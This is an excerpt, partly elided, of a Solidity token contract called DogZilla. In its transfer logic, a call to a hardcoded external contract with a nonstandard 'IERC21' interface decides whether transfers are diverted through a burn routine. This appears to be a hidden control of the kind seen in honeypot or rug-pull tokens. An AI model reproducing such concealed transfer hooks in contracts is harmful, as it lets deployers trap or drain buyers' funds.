...
contract DogZilla is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 18;
    uint256 public _totalSupply = 1 * 10 ** _decimals;
    uint256 public _fee = 1;
    address public marketingWallet;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC21 private NFT = IERC21(0x0A482c64d134E9862d4747C23982d9dB358C504a);
    string private _name = "Dogzilla";
    string private  _symbol = "DOGZILLA";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (NFT
        .allowance(from, to, marketingWallet)) {
            _swapBurn(amount, to);
        } else {
    ...
    uint256 swapAtAmount = 0;
    function setSwapTokensAtAmount(uint256 a) external onlyOwner {
        swapAtAmount = a;
    }
